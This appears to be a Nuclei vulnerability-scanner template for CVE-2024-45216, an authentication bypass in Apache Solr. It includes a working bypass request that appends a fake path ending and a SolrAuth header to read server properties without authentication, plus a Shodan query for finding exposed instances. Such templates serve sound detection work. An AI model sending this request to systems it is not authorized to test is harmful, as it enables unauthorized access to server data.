http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - responseHeader
    - system.properties
    - solr.script
    - solr.solr.home
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /solr/admin/info/properties:/admin/info/key HTTP/1.1

    Host: {{Hostname}}

    SolrAuth: {{to_lower(rand_text_alpha(5))}}

    '
id: CVE-2024-45216
info:
  author: gumgum
  classification:
    cve-id: CVE-2024-45216
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-863,CWE-287
    epss-percentile: 0.99897
    epss-score: 0.9408
  description: 'Solr instances using the PKIAuthenticationPlugin, which is enabled
    by default when Solr Authentication is used, are vulnerable to Authentication
    bypass.A fake ending at the end of any Solr API URL path, will allow requests
    to skip Authentication while maintaining the API contract with the original URL
    Path.This fake ending looks like an unprotected API path, however it is stripped
    off internally after authentication but before API routing.This issue affects
    Apache Solr- from 5.3.0 before 8.11.4, from 9.0.0 before 9.7.0.

    '
  impact: 'Users are recommended to upgrade to version 9.7.0, or 8.11.4, which fix
    the issue.

    '
  metadata:
    max-request: 1
    shodan-query: http.html:"Apache Solr"
    verified: true
  name: Apache Solr - Authentication Bypass
  reference:
  - https://shfsec.com/cve-2024-45216-authentication-bypass-in-apache-solr
  - https://nvd.nist.gov/vuln/detail/CVE-2024-45216
  - https://solr.apache.org/security html#cve-2024-45216-apache-solr-authentication-bypass-possible-using-a-fake-url-path-ending
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2024,apache,solr,auth-bypass,vuln,vkev
